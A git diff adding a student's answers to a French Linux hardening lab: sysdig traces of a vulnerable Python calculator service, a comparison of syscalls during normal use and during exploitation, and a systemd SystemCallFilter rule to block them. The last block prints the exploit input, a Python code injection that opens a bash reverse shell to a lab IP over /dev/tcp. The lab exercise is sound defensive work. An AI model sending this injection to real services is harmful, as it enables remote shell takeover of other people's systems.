@@ -266,13 +266,41 @@ Bon bah ouais on revient au thème du TP, vous le voyez venir :D
 
 - effectuez un tracing avec `strace` ou `sysdig`
 - donnez dans le compte-rendu la liste des syscalls effectués par l'application `calc.py` pendant son fonctionnement normal
+```
+[dash@localhost ~]$ sudo sysdig proc.name=python3 > normal_trace.log
+[sudo] password for dash: 
+[dash@localhost ~]$ sudo cat normal_trace.log | cut -d' ' -f7 | sort | uniq | tr '\n' ' '
+accept4 access arch_prctl bind brk close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address socket switch sysinfo write
+```
 
 🌞 **Tracez l'exécution de l'application : hack**
 
 - idem, mais pendant que vous exploitez la vulnérabilité
-- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?
 
+```
+[dash@localhost ~]$ sudo cat hack_trace.log | cut -d' ' -f7 | sort | uniq | tr '\n' ' '
+accept4 clone3 execve getsockname mmap munmap recvfrom rt_sigaction rt_sigprocmask sendto switch wait4 [dash@localhost ~]$
+```
+- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?
+Oui. `clone3`, `rt_sigprocmask` et `wait4`  
 🌞 **Adaptez le `.service`**
 
 - ajoutez un filtrage des *syscalls* dans le fichier `calculatrice.service`
 - vérifiez que l'exploitation est devenue plus compliquée
+
+```
+[dash@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
+SystemCallFilter=~clone3 rt_sigprocmask wait4
+[dash@localhost ~]$ sudo systemctl daemon-reload
+[dash@localhost ~]$ sudo systemctl restart calculatrice
+
+```
+
+```
+┌─[dashboard@parrot]─[~]
+└──╼ $nc 192.168.133.129 13337
+
+Hello__import__('os').system("bash -c 'bash -i >& /dev/tcp/192.168.133.128/4444 0>&1'")
+┌─[dashboard@parrot]─[~]
+└──╼ $
+```
